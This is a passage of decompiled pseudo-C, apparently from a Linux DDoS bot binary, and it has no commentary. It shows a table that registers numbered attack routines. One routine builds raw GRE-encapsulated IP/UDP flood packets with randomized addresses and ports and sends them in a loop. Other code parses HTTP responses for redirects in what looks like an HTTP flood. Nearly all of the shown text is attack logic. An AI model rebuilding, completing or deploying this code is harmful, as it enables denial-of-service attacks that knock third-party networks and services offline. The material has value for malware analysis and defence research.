    }
    if (cVar4 != '\n') goto LAB_080487f0;
    do {
      puVar18 = (undefined4 *)FUN_08050d40();
      *puVar18 = 0;
      iVar8 = FUN_080526f0(piVar31[-0x16b],&cStack_517a + 1,0x2800,0x4000);
      if (iVar8 == 0) {
        puVar18 = (undefined4 *)FUN_08050d40();
        *puVar18 = 0x68;
        break;
      }
    } while (iVar8 != -1);
    piVar19 = (int *)FUN_08050d40();
    if ((*piVar19 != 0xb) && (piVar19 = (int *)FUN_08050d40(), *piVar19 != 0xb)) goto LAB_08048f58;
    if (*(char *)(piVar31 + -0x16a) == '\0') goto LAB_080487f0;
    goto LAB_08048f25;
  }
  goto LAB_080487f0;
LAB_08049659:
  uVar13 = FUN_0804fc20(0x26,0,iVar8,iVar8);
  iVar8 = FUN_08050900(&cStack_517a + 1,piVar19,uVar13);
  iVar8 = iVar8 + 1;
  if (iVar8 != 0) {
    uVar13 = FUN_0804fc20(0x26,0,iVar8,iVar8);
    iVar9 = FUN_08050900(&cStack_517a + 1,piVar19,uVar13);
    iVar9 = iVar9 + (uint)((&cStack_517a)[iVar9 + 1] == ' ');
    pcVar25 = &cStack_517a + iVar9 + 1;
    iVar8 = FUN_080506d0(pcVar25,(int)piVar19 - iVar9,&DAT_080546e6,2);
    if (iVar8 != -1) {
      if (1 < iVar8) {
        iVar8 = iVar8 + -2;
      }
      (&cStack_517a)[iVar9 + iVar8 + 1] = '\0';
      iVar10 = FUN_080506d0(pcVar25,iVar8 + 1,&DAT_080546eb,4);
      if (iVar10 == 4) {
        local_58 = (int *)0x7;
        if ((&cStack_517a)[iVar9 + 5] == 's') {
          local_58 = (int *)0x8;
        }
        FUN_08052d88(pcVar25,pcVar25 + (int)local_58,(iVar8 + 1) - (int)local_58,piVar29);
        local_58 = (int *)0x0;
        if (*pcVar25 != '\0') {
          pcVar27 = pcVar25;
          if (*pcVar25 != '/') {
            local_58 = (int *)0x0;
            do {
              local_58 = (int *)((int)local_58 + 1);
              pcVar27 = pcVar25 + (int)local_58;
              if (*pcVar27 == '\0') goto LAB_08049af4;
            } while (*pcVar27 != '/');
          }
          *pcVar27 = '\0';
        }
LAB_08049af4:
        iVar8 = FUN_08050620(pcVar25);
        if ((0 < iVar8) && (iVar8 = FUN_08050620(pcVar25), iVar8 < 0x80)) {
          FUN_08050640((int)piVar31 + -0x297,pcVar25,extraout_ECX_09,extraout_ECX_09);
        }
        pcVar25 = &cStack_517a + iVar9 + 2;
        iVar8 = FUN_08050620(pcVar25 + (int)local_58);
        if (iVar8 < 0x100) {
          FUN_080506b0((int)piVar31 + -0x397,0xff,piVar29,piVar29);
          iVar8 = FUN_08050620(pcVar25 + (int)local_58);
          if (0 < iVar8) {
            FUN_08050640((int)piVar31 + -0x397,pcVar25 + (int)local_58,iVar8,iVar8);
          }
        }
      }
      else if (*pcVar25 == '/') {
        pcVar25 = &cStack_517a + iVar9 + 2;
        piVar29 = (int *)((int)piVar31 + -0x397);
        FUN_080506b0(piVar29,0xff,iVar10,iVar10);
        iVar8 = FUN_08050620(pcVar25 + (int)local_58);
        if ((0 < iVar8) && (iVar8 = FUN_08050620(pcVar25 + (int)local_58), iVar8 < 0x100)) {
          FUN_08050640(piVar29,pcVar25 + (int)local_58,iVar8,iVar8);
        }
      }
LAB_08048f25:
      *(undefined *)(piVar31 + -0x16a) = 1;
      goto LAB_080487f0;
    }
  }
  uVar13 = FUN_0804fc20(0x25,0,iVar8,iVar8);
  iVar8 = FUN_08050900(&cStack_517a + 1,piVar19,uVar13);
  piVar29 = piVar19;
  if (iVar8 != -1) {
    uVar13 = FUN_0804fc20(0x25,0,pcVar25,pcVar25);
    iVar8 = FUN_08050900(&cStack_517a + 1,piVar19,uVar13);
    iVar8 = iVar8 + (uint)((&cStack_517a)[iVar8 + 1] == ' ');
    pcVar25 = &cStack_517a + iVar8 + 1;
    piVar29 = (int *)FUN_080506d0(pcVar25,(int)piVar19 - iVar8,&DAT_080546e6,2);
    if (piVar29 != (int *)0xffffffff) {
      if (1 < (int)piVar29) {
        piVar29 = (int *)((int)piVar29 + -2);
      }
      local_58 = (int *)0x0;
      (&cStack_517a + 1 + (int)piVar29)[iVar8] = '\0';
      cVar4 = *pcVar25;
      pcVar27 = pcVar25;
      if ((byte)(cVar4 - 0x30U) < 10) {
        piVar24 = (int *)0x1;
        do {
          pcVar27 = pcVar25 + (int)piVar24;
          local_58 = piVar24;
          piVar24 = (int *)((int)piVar24 + 1);
          cVar4 = *pcVar27;
        } while ((byte)(cVar4 - 0x30U) < 10);
      }
      piVar24 = local_58;
      if (cVar4 != '\0') {
        *pcVar27 = '\0';
        local_58 = (int *)((int)local_58 + 1);
        if (pcVar25[(int)local_58] == ' ') {
          local_58 = (int *)((int)piVar24 + 2);
        }
        uVar13 = FUN_08050620(pcVar25 + (int)local_58);
        iVar8 = FUN_08050900(pcVar25 + (int)local_58,uVar13,&DAT_080546f0);
        if (iVar8 != -1) {
          uVar13 = FUN_08050620(pcVar25 + (int)local_58);
          iVar8 = FUN_08050900(pcVar25 + (int)local_58,uVar13,&DAT_080546f0);
          local_58 = (int *)((int)local_58 + iVar8);
        }
        piVar19 = local_58;
        if (pcVar25[(int)local_58] == '\"') {
          local_58 = (int *)((int)local_58 + 1);
          pcVar27 = pcVar25 + (int)local_58;
          piVar19 = (int *)FUN_08050620(pcVar27);
          if ((pcVar27 + -1)[(int)piVar19] == '\"') {
            pcVar27 = pcVar25 + (int)local_58;
            piVar19 = (int *)FUN_08050620(pcVar27);
            (pcVar27 + -1)[(int)piVar19] = '\0';
          }
        }
        iVar8 = FUN_08050720(pcVar25,10,piVar19,piVar19);
        if (iVar8 - 1U < 9) {
          while (uVar15 = FUN_080530dc(0), uVar15 < (uint)(iVar8 + (int)piVar17)) {
            FUN_080531dc(1);
          }
        }
        pcVar27 = pcVar25 + (int)local_58;
        uVar13 = FUN_08050620(pcVar27);
        iVar8 = FUN_08050900(pcVar27,uVar13,&DAT_080546eb);
        if (iVar8 == 4) {
          local_58 = (int *)0x7;
          if (pcVar27[4] == 's') {
            local_58 = (int *)0x8;
          }
          piVar29 = (int *)((int)piVar29 - (int)local_58);
          FUN_08052d88(pcVar27,pcVar27 + (int)local_58,(int)piVar29 + 1,pcVar25);
          local_58 = (int *)0x0;
          if (*pcVar27 != '\0') {
            pcVar25 = pcVar27;
            if (*pcVar27 != '/') {
              local_58 = (int *)0x0;
              do {
                local_58 = (int *)((int)local_58 + 1);
                pcVar25 = pcVar27 + (int)local_58;
                if (*pcVar25 == '\0') goto LAB_08049c9e;
              } while (*pcVar25 != '/');
            }
            *pcVar25 = '\0';
          }
LAB_08049c9e:
          iVar8 = FUN_08050620(pcVar27);
          if ((0 < iVar8) && (iVar8 = FUN_08050620(pcVar27), iVar8 < 0x80)) {
            FUN_08050640((int)piVar31 + -0x297,pcVar27,extraout_ECX_11,extraout_ECX_11);
          }
LAB_08049cd4:
          pcVar27 = pcVar27 + 1;
          iVar8 = FUN_08050620(pcVar27 + (int)local_58);
          if (iVar8 < 0x100) {
            FUN_080506b0((int)piVar31 + -0x397,0xff,piVar29,piVar29);
            iVar8 = FUN_08050620(pcVar27 + (int)local_58);
            piVar19 = local_58;
            if (0 < iVar8) {
              FUN_08050640((int)piVar31 + -0x397,pcVar27 + (int)local_58,iVar8,iVar8);
              piVar29 = piVar19;
            }
          }
        }
        else if (*pcVar27 == '/') goto LAB_08049cd4;
        *(undefined *)(piVar31 + -0x16a) = 10;
        *(undefined4 *)((int)piVar31 + -0x15) = 0x544547;
        goto LAB_080487f0;
      }
    }
  }
  iVar8 = FUN_080506d0(&cStack_517a + 1,piVar19,&DAT_080546e4,4);
  uVar13 = FUN_08050980((int)piVar31 + -0x15,&DAT_080546f5);
  if (((char)uVar13 == '\0') &&
     (cVar4 = FUN_08050980((int)piVar31 + -0x15,&DAT_080546d4,uVar13,uVar13), cVar4 == '\0')) {
    *(char *)(piVar31 + -0x16a) = (iVar8 < (int)piVar19) * '\t' + '\x01';
  }
  else {
    *(undefined *)(piVar31 + -0x16a) = 7;
  }
  FUN_080526f0(piVar31[-0x16b],&cStack_517a + 1,iVar8,0x4000);
LAB_080487f0:
  piVar31 = piVar31 + 0x311;
  local_5190 = local_5190 + 1;
  if (local_5190 == local_5188) goto LAB_08048564;
  goto LAB_0804880d;
}



undefined8 FUN_08049ef0(byte param_1,undefined4 *param_2,char param_3,undefined4 param_4)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  uint uVar3;
  undefined4 uStack_c;
  
  uStack_c = CONCAT13(param_3,(undefined3)uStack_c);
  if (param_1 != 0) {
    if (*(char *)(param_2 + 1) != param_3) {
      uVar3 = 0;
      puVar2 = param_2;
      do {
        param_2 = puVar2 + 2;
        uVar3 = uVar3 + 1;
        if (param_1 == uVar3) goto LAB_08049f36;
        puVar1 = puVar2 + 3;
        puVar2 = param_2;
      } while (*(char *)puVar1 != param_3);
    }
    return CONCAT44(uStack_c,*param_2);
  }
LAB_08049f36:
  return CONCAT44(uStack_c,param_4);
}



void FUN_08049f50(uint param_1,byte param_2,byte param_3,undefined4 param_4,byte param_5,
                 uint param_6)

{
  char cVar1;
  code *pcVar2;
  int iVar3;
  undefined4 uVar4;
  uint uVar5;
  code **extraout_EDX;
  code **ppcVar6;
  uint uVar7;
  uint *puVar8;
  undefined *puVar9;
  uint uVar10;
  uint uVar11;
  uint auStack_30 [5];
  undefined auStack_1c [8];
  uint local_14;
  
  puVar8 = (uint *)auStack_1c;
  uVar7 = (uint)param_2;
  uVar11 = (uint)param_3;
  uVar10 = (uint)param_5;
  auStack_30[4] = 0x8049f69;
  iVar3 = FUN_08052955();
  if ((iVar3 == -1) || (0 < iVar3)) {
    return;
  }
  auStack_30[4] = 0x8049f85;
  iVar3 = FUN_08052955();
  puVar9 = auStack_1c;
  if (iVar3 == -1) goto LAB_08049fd2;
  if (iVar3 != 0) goto LAB_08049fdc;
  puVar8 = auStack_30 + 1;
  auStack_30[1] = param_1;
  FUN_080531dc();
  uVar4 = FUN_0805316c();
  uVar11 = auStack_30[2];
  uVar10 = auStack_30[1];
  auStack_30[2] = 9;
  auStack_30[1] = uVar4;
  FUN_08052a70();
  auStack_30[1] = 0;
  FUN_08050d4d();
  ppcVar6 = extraout_EDX;
LAB_08049fb5:
  *(uint *)((int)puVar8 + -4) = param_6;
  *(uint *)((int)puVar8 + -8) = uVar10 & 0xff;
  *(undefined4 *)((int)puVar8 + -0xc) = param_4;
  *(uint *)((int)puVar8 + -0x10) = uVar11 & 0xff;
  pcVar2 = *ppcVar6;
  *(undefined4 *)((int)puVar8 + -0x14) = 0x8049fcf;
  (*pcVar2)();
  uVar7 = param_6;
  puVar9 = (undefined *)puVar8;
LAB_08049fd2:
  do {
    do {
      puVar8 = (uint *)(puVar9 + -0x10);
      *(undefined4 *)(puVar9 + -0x10) = 0;
      *(undefined4 *)(puVar9 + -0x14) = 0x8049fdc;
      FUN_08050d4d();
LAB_08049fdc:
      local_14 = (uint)DAT_080550bc;
      puVar9 = (undefined *)puVar8;
    } while (DAT_080550bc == 0);
    uVar5 = 0;
    ppcVar6 = (code **)*DAT_080550c0;
    cVar1 = *(char *)(ppcVar6 + 1);
    while( true ) {
      if (cVar1 == (char)uVar7) goto LAB_08049fb5;
      uVar5 = uVar5 + 1;
      if (uVar5 == local_14) break;
      ppcVar6 = (code **)DAT_080550c0[uVar5];
      cVar1 = *(char *)(ppcVar6 + 1);
    }
  } while( true );
}



void __regparm3 FUN_0804a010(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  
  if (DAT_080550e0 != 0) {
    FUN_08052a70(DAT_080550e0,9,param_3,param_3);
    param_3 = extraout_ECX;
    param_2 = extraout_EDX;
  }
  DAT_080550e0 = 0;
  if (DAT_080550e4 != 0) {
    FUN_08052a70(DAT_080550e4,9,param_2,param_2);
    param_3 = extraout_ECX_04;
    param_2 = extraout_EDX_05;
  }
  DAT_080550e4 = 0;
  if (DAT_080550e8 != 0) {
    FUN_08052a70(DAT_080550e8,9,param_3,param_3);
    param_3 = extraout_ECX_03;
    param_2 = extraout_EDX_04;
  }
  DAT_080550e8 = 0;
  if (DAT_080550ec != 0) {
    FUN_08052a70(DAT_080550ec,9,param_2,param_2);
    param_3 = extraout_ECX_02;
    param_2 = extraout_EDX_03;
  }
  DAT_080550ec = 0;
  if (DAT_080550f0 != 0) {
    FUN_08052a70(DAT_080550f0,9,param_3,param_3);
    param_3 = extraout_ECX_01;
    param_2 = extraout_EDX_02;
  }
  DAT_080550f0 = 0;
  if (DAT_080550f4 != 0) {
    FUN_08052a70(DAT_080550f4,9,param_2,param_2);
    param_3 = extraout_ECX_00;
    param_2 = extraout_EDX_01;
  }
  DAT_080550f4 = 0;
  if (DAT_080550f8 != 0) {
    FUN_08052a70(DAT_080550f8,9,param_3,param_3);
    param_2 = extraout_EDX_00;
  }
  DAT_080550f8 = 0;
  if (DAT_080550fc == 0) {
    DAT_080550fc = 0;
    return;
  }
  FUN_08052a70(DAT_080550fc,9,param_2,param_2);
  DAT_080550fc = 0;
  return;
}



void FUN_0804a160(undefined4 *param_1,uint param_2)

{
  undefined uVar1;
  undefined4 uVar2;
  uint uVar3;
  undefined2 *puVar4;
  undefined4 uVar5;
  undefined2 *puVar6;
  byte *pbVar7;
  undefined4 *puVar8;
  int iVar9;
  undefined4 *puVar10;
  uint uVar11;
  uint uVar12;
  undefined4 *puVar13;
  undefined4 *puVar14;
  undefined4 *local_2c;
  byte local_21;
  undefined4 *local_20;
  undefined4 *local_1c;
  int local_18;
  
  if (param_2 < 4) {
    return;
  }
  uVar2 = FUN_080526b8(*param_1);
  if (param_2 == 4) {
    return;
  }
  uVar1 = *(undefined *)(param_1 + 1);
  if (param_2 == 5) {
    return;
  }
  if (*(byte *)((int)param_1 + 5) == 0) {
    return;
  }
  uVar3 = (uint)*(byte *)((int)param_1 + 5);
  if (param_2 - 6 < uVar3 * 5) {
    return;
  }
  puVar4 = (undefined2 *)FUN_08051070(uVar3,0x18,uVar3,uVar3);
  puVar13 = (undefined4 *)(uVar3 * 5 + (int)(undefined4 *)((int)param_1 + 6));
  puVar6 = puVar4;
  puVar8 = (undefined4 *)((int)param_1 + 6);
  uVar12 = param_2 - 6;
  do {
    uVar11 = uVar12;
    puVar10 = puVar8;
    uVar5 = *puVar10;
    uVar12 = uVar11 - 5;
    *(undefined4 *)(puVar6 + 8) = uVar5;
    puVar8 = (undefined4 *)((int)puVar10 + 5);
    *(byte *)(puVar6 + 10) = *(byte *)(puVar10 + 1);
    *puVar6 = 2;
    *(undefined4 *)(puVar6 + 2) = uVar5;
    puVar6 = puVar6 + 0xc;
  } while (puVar8 != puVar13);
  puVar14 = (undefined4 *)0x0;
  if (uVar12 == 0) goto LAB_0804a24b;
  puVar13 = (undefined4 *)(uint)*(byte *)puVar8;
  if (*(byte *)puVar8 == 0) {
    local_20 = (undefined4 *)0x0;
  }
  else {
    puVar14 = (undefined4 *)FUN_08051070(puVar13,8,0,0);
    if ((uVar11 == 6) || (*(byte *)(puVar14 + 1) = *(byte *)((int)puVar10 + 6), uVar12 == 2))
    goto LAB_0804a24b;
    local_21 = *(byte *)((int)puVar10 + 7);
    pbVar7 = (byte *)(uint)local_21;
    local_18 = uVar11 - 8;
    uVar12 = (uint)local_21;
    if (local_18 < (int)uVar12) goto LAB_0804a24b;
    puVar10 = puVar10 + 2;
    local_2c = (undefined4 *)0x0;
    local_1c = puVar14;
    while( true ) {
      uVar5 = FUN_08051070(uVar12 + 1,1,pbVar7,pbVar7);
      *local_1c = uVar5;
      FUN_08050680(uVar5,puVar10,uVar12);
      local_2c = (undefined4 *)((int)local_2c + 1);
      local_20 = puVar13;
      if (local_2c == puVar13) break;
      local_18 = local_18 - uVar12;
      if (local_18 == 0) goto LAB_0804a24b;
      pbVar7 = (byte *)((uint)local_21 + (int)puVar10);
      local_1c = puVar14 + (int)local_2c * 2;
      *(byte *)(puVar14 + (int)local_2c * 2 + 1) = *pbVar7;
      if (local_18 == 1) goto LAB_0804a24b;
      local_21 = pbVar7[1];
      local_18 = local_18 + -2;
      uVar12 = (uint)local_21;
      if (local_18 < (int)uVar12) goto LAB_0804a24b;
      puVar10 = (undefined4 *)(pbVar7 + 2);
    }
  }
  puVar8 = (undefined4 *)FUN_08050d40();
  *puVar8 = 0;
  FUN_08049f50(uVar2,uVar1,uVar3,puVar4,local_20,puVar14,puVar8,puVar8);
LAB_0804a24b:
  if (puVar4 != (undefined2 *)0x0) {
    FUN_08051550(puVar4);
  }
  if (puVar14 == (undefined4 *)0x0) {
    return;
  }
  if ((char)puVar13 != '\0') {
    iVar9 = 1;
    do {
      if (puVar14[iVar9 * 2 + -2] != 0) {
        FUN_08051550(puVar14[iVar9 * 2 + -2]);
      }
      iVar9 = iVar9 + 1;
    } while (iVar9 != ((uint)puVar13 & 0xff) + 1);
  }
  FUN_08051550();
  return;
}



undefined8 FUN_0804a3b0(byte param_1,int *param_2,char param_3,undefined4 param_4)

{
  int *piVar1;
  int *piVar2;
  uint uVar3;
  undefined8 uVar4;
  undefined4 uStack_10;
  
  uStack_10 = CONCAT13(param_3,(undefined3)uStack_10);
  if (param_1 != 0) {
    if (param_3 != *(char *)(param_2 + 1)) {
      uVar3 = 0;
      piVar2 = param_2;
      do {
        param_2 = piVar2 + 2;
        uVar3 = uVar3 + 1;
        if (param_1 == uVar3) goto LAB_0804a3fb;
        piVar1 = piVar2 + 3;
        piVar2 = param_2;
      } while (param_3 != *(char *)piVar1);
    }
    if (*param_2 != 0) {
      uVar4 = FUN_08052550();
      return uVar4;
    }
  }
LAB_0804a3fb:
  return CONCAT44(uStack_10,param_4);
}



undefined4 FUN_0804a420(byte param_1,int *param_2,char param_3,undefined4 param_4)

{
  int *piVar1;
  int *piVar2;
  undefined4 uVar3;
  uint uVar4;
  
  if (param_1 != 0) {
    if (param_3 != *(char *)(param_2 + 1)) {
      uVar4 = 0;
      piVar2 = param_2;
      do {
        param_2 = piVar2 + 2;
        uVar4 = uVar4 + 1;
        if (param_1 == uVar4) {
          return param_4;
        }
        piVar1 = piVar2 + 3;
        piVar2 = param_2;
      } while (param_3 != *(char *)piVar1);
    }
    if (*param_2 != 0) {
      uVar3 = FUN_08050720();
      return uVar3;
    }
  }
  return param_4;
}



undefined4 FUN_0804a490(void)

{
  code **ppcVar1;
  undefined4 *puVar2;
  uint uVar3;
  
  ppcVar1 = (code **)FUN_08051070(1,8);
  *(undefined *)(ppcVar1 + 1) = 0;
  *ppcVar1 = FUN_0804c890;
  DAT_080550c0 = FUN_08051f70(DAT_080550c0,(uint)DAT_080550bc * 4 + 4);
  uVar3 = (uint)DAT_080550bc;
  DAT_080550bc = DAT_080550bc + 1;
  *(code ***)(DAT_080550c0 + uVar3 * 4) = ppcVar1;
  ppcVar1 = (code **)FUN_08051070(1,8);
  *(undefined *)(ppcVar1 + 1) = 1;
  *ppcVar1 = FUN_0804cce0;
  DAT_080550c0 = FUN_08051f70(DAT_080550c0,(uint)DAT_080550bc * 4 + 4);
  uVar3 = (uint)DAT_080550bc;
  DAT_080550bc = DAT_080550bc + 1;
  *(code ***)(DAT_080550c0 + uVar3 * 4) = ppcVar1;
  ppcVar1 = (code **)FUN_08051070(1,8);
  *(undefined *)(ppcVar1 + 1) = 2;
  *ppcVar1 = FUN_0804d0b0;
  DAT_080550c0 = FUN_08051f70(DAT_080550c0,(uint)DAT_080550bc * 4 + 4);
  uVar3 = (uint)DAT_080550bc;
  DAT_080550bc = DAT_080550bc + 1;
  *(code ***)(DAT_080550c0 + uVar3 * 4) = ppcVar1;
  ppcVar1 = (code **)FUN_08051070(1,8);
  *(undefined *)(ppcVar1 + 1) = 9;
  *ppcVar1 = FUN_0804c5d0;
  DAT_080550c0 = FUN_08051f70(DAT_080550c0,(uint)DAT_080550bc * 4 + 4);
  uVar3 = (uint)DAT_080550bc;
  DAT_080550bc = DAT_080550bc + 1;
  *(code ***)(DAT_080550c0 + uVar3 * 4) = ppcVar1;
  ppcVar1 = (code **)FUN_08051070(1,8);
  *(undefined *)(ppcVar1 + 1) = 3;
  *ppcVar1 = FUN_0804c000;
  DAT_080550c0 = FUN_08051f70(DAT_080550c0,(uint)DAT_080550bc * 4 + 4);
  uVar3 = (uint)DAT_080550bc;
  DAT_080550bc = DAT_080550bc + 1;
  *(code ***)(DAT_080550c0 + uVar3 * 4) = ppcVar1;
  ppcVar1 = (code **)FUN_08051070(1,8);
  *(undefined *)(ppcVar1 + 1) = 4;
  *ppcVar1 = FUN_0804b9f0;
  DAT_080550c0 = FUN_08051f70(DAT_080550c0,(uint)DAT_080550bc * 4 + 4);
  uVar3 = (uint)DAT_080550bc;
  DAT_080550bc = DAT_080550bc + 1;
  *(code ***)(DAT_080550c0 + uVar3 * 4) = ppcVar1;
  ppcVar1 = (code **)FUN_08051070(1,8);
  *(undefined *)(ppcVar1 + 1) = 5;
  *ppcVar1 = FUN_0804b330;
  DAT_080550c0 = FUN_08051f70(DAT_080550c0,(uint)DAT_080550bc * 4 + 4);
  uVar3 = (uint)DAT_080550bc;
  DAT_080550bc = DAT_080550bc + 1;
  *(code ***)(DAT_080550c0 + uVar3 * 4) = ppcVar1;
  ppcVar1 = (code **)FUN_08051070(1,8);
  *(undefined *)(ppcVar1 + 1) = 6;
  *ppcVar1 = FUN_0804adb0;
  DAT_080550c0 = FUN_08051f70(DAT_080550c0,(uint)DAT_080550bc * 4 + 4);
  uVar3 = (uint)DAT_080550bc;
  DAT_080550bc = DAT_080550bc + 1;
  *(code ***)(DAT_080550c0 + uVar3 * 4) = ppcVar1;
  ppcVar1 = (code **)FUN_08051070(1,8);
  *(undefined *)(ppcVar1 + 1) = 7;
  *ppcVar1 = FUN_0804a7a0;
  DAT_080550c0 = FUN_08051f70(DAT_080550c0,(uint)DAT_080550bc * 4 + 4);
  uVar3 = (uint)DAT_080550bc;
  DAT_080550bc = DAT_080550bc + 1;
  *(code ***)(DAT_080550c0 + uVar3 * 4) = ppcVar1;
  puVar2 = (undefined4 *)FUN_08051070(1,8);
  *(undefined *)(puVar2 + 1) = 10;
  *puVar2 = 0x80481a0;
  DAT_080550c0 = FUN_08051f70(DAT_080550c0,(uint)DAT_080550bc * 4 + 4);
  *(undefined4 **)(DAT_080550c0 + (uint)DAT_080550bc * 4) = puVar2;
  DAT_080550bc = DAT_080550bc + 1;
  return 1;
}



void FUN_0804a7a0(byte param_1,int param_2,undefined param_3,undefined4 param_4)

{
  undefined2 *puVar1;
  undefined *puVar2;
  int iVar3;
  undefined uVar4;
  undefined uVar5;
  char cVar6;
  char cVar7;
  char cVar8;
  ushort uVar9;
  ushort uVar10;
  short sVar11;
  undefined2 uVar12;
  short sVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  int iVar18;
  uint uVar19;
  undefined4 uVar20;
  uint uVar21;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  int local_14;
  
  uVar21 = (uint)param_1;
  iVar14 = FUN_08051070(uVar21,4);
  uVar4 = FUN_0804a420(param_3,param_4,2,0);
  uVar9 = FUN_0804a420(param_3,param_4,3,0xffff);
  uVar5 = FUN_0804a420(param_3,param_4,4,0x40);
  cVar6 = FUN_0804a420(param_3,param_4,5,1);
  uVar10 = FUN_0804a420(param_3,param_4,6,0xffff);
  sVar11 = FUN_0804a420(param_3,param_4,7,0xffff);
  iVar15 = FUN_0804a420(param_3,param_4,0,0x200);
  cVar7 = FUN_0804a420(param_3,param_4,1,1);
  cVar8 = FUN_0804a420(param_3,param_4,0x13,0);
  iVar16 = FUN_0804a420(param_3,param_4,0x19,DAT_0805569c);
  iVar17 = FUN_08052834(2,3,6);
  if (iVar17 != -1) {
    local_14 = 1;
    iVar18 = FUN_080527e0(iVar17,0,3,&local_14,4);
    if (iVar18 != -1) {
      local_14 = 0;
      if (param_1 != 0) {
        uVar19 = (uint)uVar10;
        do {
          iVar18 = local_14;
          uVar20 = FUN_08051070(0x5e6,4,uVar19,uVar19);
          *(undefined4 *)(iVar14 + iVar18 * 4) = uVar20;
          puVar2 = *(undefined **)(iVar14 + local_14 * 4);
          *puVar2 = 0x45;
          puVar2[1] = uVar4;
          uVar12 = FUN_08052544(iVar15 + 0x42U & 0xffff);
          *(undefined2 *)(puVar2 + 2) = uVar12;
          uVar12 = FUN_08052544(uVar9);
          *(undefined2 *)(puVar2 + 4) = uVar12;
          puVar2[8] = uVar5;
          if (cVar6 != '\0') {
            uVar12 = FUN_08052544(0x4000);
            *(undefined2 *)(puVar2 + 6) = uVar12;
          }
          puVar2[9] = 0x2f;
          *(int *)(puVar2 + 0xc) = iVar16;
          *(undefined4 *)(puVar2 + 0x10) = *(undefined4 *)(param_2 + 0x10 + local_14 * 0x18);
          uVar12 = FUN_08052544(0x6558);
          *(undefined2 *)(puVar2 + 0x16) = uVar12;
          uVar12 = FUN_08052544(0x800);
          *(undefined2 *)(puVar2 + 0x24) = uVar12;
          puVar2[0x26] = 0x45;
          puVar2[0x27] = uVar4;
          uVar12 = FUN_08052544(iVar15 + 0x1cU & 0xffff);
          *(undefined2 *)(puVar2 + 0x28) = uVar12;
          uVar12 = FUN_08052544(uVar9 ^ 0xffff);
          puVar2[0x2e] = uVar5;
          *(undefined2 *)(puVar2 + 0x2a) = uVar12;
          if (cVar6 != '\0') {
            uVar12 = FUN_08052544(0x4000);
            *(undefined2 *)(puVar2 + 0x2c) = uVar12;
          }
          puVar2[0x2f] = 0x11;
          iVar18 = FUN_0804f450();
          *(int *)(puVar2 + 0x32) = iVar18;
          if (cVar8 == '\0') {
            *(uint *)(puVar2 + 0x36) = iVar18 - 0x400U ^ 0xffffffff;
          }
          else {
            *(undefined4 *)(puVar2 + 0x36) = *(undefined4 *)(puVar2 + 0x10);
          }
          uVar12 = FUN_08052544((uint)uVar10);
          *(undefined2 *)(puVar2 + 0x3a) = uVar12;
          uVar12 = FUN_08052544(sVar11);
          *(undefined2 *)(puVar2 + 0x3c) = uVar12;
          uVar19 = FUN_08052544(iVar15 + 8U & 0xffff);
          local_14 = local_14 + 1;
          *(short *)(puVar2 + 0x3e) = (short)uVar19;
        } while (local_14 < (int)uVar21);
      }
      do {
        do {
          local_14 = 0;
        } while (param_1 == 0);
        do {
          iVar3 = *(int *)(iVar14 + local_14 * 4);
          iVar18 = param_2 + local_14 * 0x18;
          if (*(byte *)(iVar18 + 0x14) < 0x20) {
            iVar18 = FUN_080526b8(*(undefined4 *)(iVar18 + 0x10));
            uVar19 = FUN_0804f450();
            uVar20 = FUN_08052518((uVar19 >> (*(byte *)(param_2 + 0x14 + local_14 * 0x18) & 0x1f)) +
                                  iVar18);
            *(undefined4 *)(iVar3 + 0x10) = uVar20;
            if (iVar16 != -1) goto LAB_0804ab69;
LAB_0804ad07:
            uVar20 = FUN_0804f450();
            *(undefined4 *)(iVar3 + 0xc) = uVar20;
            if (uVar9 != 0xffff) goto LAB_0804ab75;
LAB_0804ad1b:
            sVar13 = FUN_0804f450();
            *(short *)(iVar3 + 4) = sVar13;
            *(ushort *)(iVar3 + 0x2a) = sVar13 - 1000U ^ 0xffff;
            if (uVar10 != 0xffff) goto LAB_0804ab81;
LAB_0804ad3c:
            uVar12 = FUN_0804f450();
            *(undefined2 *)(iVar3 + 0x3a) = uVar12;
            if (sVar11 != -1) goto LAB_0804ab8d;
LAB_0804ad51:
            uVar12 = FUN_0804f450();
            *(undefined2 *)(iVar3 + 0x3c) = uVar12;
            if (cVar8 != '\0') goto LAB_0804ab98;
LAB_0804ad65:
            uVar20 = FUN_0804f450();
            *(undefined4 *)(iVar3 + 0x36) = uVar20;
          }
          else {
            if (iVar16 == -1) goto LAB_0804ad07;
LAB_0804ab69:
            if (uVar9 == 0xffff) goto LAB_0804ad1b;
LAB_0804ab75:
            if (uVar10 == 0xffff) goto LAB_0804ad3c;
LAB_0804ab81:
            if (sVar11 == -1) goto LAB_0804ad51;
LAB_0804ab8d:
            if (cVar8 == '\0') goto LAB_0804ad65;
LAB_0804ab98:
            *(undefined4 *)(iVar3 + 0x36) = *(undefined4 *)(iVar3 + 0x10);
          }
          local_18 = FUN_0804f450();
          local_1c = FUN_0804f450();
          local_20 = FUN_0804f450();
          FUN_08050680(iVar3 + 0x18,&local_18,4,local_20);
          FUN_08050680(iVar3 + 0x1e,&local_1c,4);
          FUN_08050680(iVar3 + 0x1c,&local_20,2);
          uVar20 = FUN_08050680(iVar3 + 0x22,(int)&local_20 + 2,2);
          if (cVar7 != '\0') {
            uVar20 = FUN_0804f5e0(iVar3 + 0x42,iVar15,uVar20,uVar20);
          }
          *(undefined2 *)(iVar3 + 10) = 0;
          uVar12 = FUN_0804d7a0(iVar3,0x14,uVar20,uVar20);
          *(undefined2 *)(iVar3 + 10) = uVar12;
          *(undefined2 *)(iVar3 + 0x30) = 0;
          uVar12 = FUN_0804d7a0(iVar3 + 0x26,0x14);
          *(undefined2 *)(iVar3 + 0x30) = uVar12;
          *(undefined2 *)(iVar3 + 0x40) = 0;
          uVar12 = FUN_0804d7f0(iVar3 + 0x26,iVar3 + 0x3a,*(undefined2 *)(iVar3 + 0x3e),iVar15 + 8);
          *(undefined2 *)(iVar3 + 0x40) = uVar12;
          puVar1 = (undefined2 *)(param_2 + local_14 * 0x18);
